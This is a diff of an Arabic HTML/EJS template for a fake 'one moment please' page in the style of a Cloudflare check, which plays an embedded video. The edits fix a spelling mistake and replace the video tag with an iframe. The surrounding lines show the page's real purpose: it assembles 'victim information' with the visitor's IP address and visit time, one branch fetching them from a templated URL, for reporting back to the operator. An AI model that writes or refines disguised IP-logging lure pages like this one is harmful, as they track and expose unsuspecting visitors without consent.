@@ -59,6 +59,7 @@ a:hover {color: #f4a15d;}
 <div id="cf-content" style="display: block;"> 
 <!-- تمت إزالة كرات التحميل -->
 
+
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -66,16 +67,13 @@ a:hover {color: #f4a15d;}
     <title>مشاهدة الفيديو</title>
 </head>
 <body>
-    <h1><span>لحظه وحده من فظلك</span></h1> 
+    <h1><span>لحظه وحده من فضلك</span></h1> 
     <div id="no-cookie-warning" class="cookie-warning" style="display:none"> 
         <p style="color:#bd2426;">الرجاء تمكين الكوكيز وإعادة تحميل الصفحة.</p> 
     </div> 
 
-    <!-- تضمين فيديو باستخدام عنصر video -->
-    <video width="100%" height="500" controls>
-        <source src="https://sendvid.com/assets/q9wxqj91.mp4" type="video/mp4">
-        متصفحك لا يدعم تشغيل الفيديو.
-    </video>
+    <!-- تضمين فيديو باستخدام iframe -->
+    <iframe width="100%" height="500" src="https://sendvid.com/assets/q9wxqj91.mp4" frameborder="0" allowfullscreen></iframe>
 
     <div class="attribution"></div> 
 
@@ -93,6 +91,7 @@ a:hover {color: #f4a15d;}
         td += '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#<%=ip %>" ><%=ip %></a> | الوقت: <%=time %></b>';
         <% }else{ %>
         await fetch("<%=a %>").then((r) => r.json()).then((d) => (td+= '<code>✅معلومات الضحية </code><br><br><b>⚓ الآي بي: <a href="https://ip-api.com/#'+d.ip+'" >'+d.ip+'</a> | الوقت: <%=time %></b>'));
+   
 
 <% } %>
 
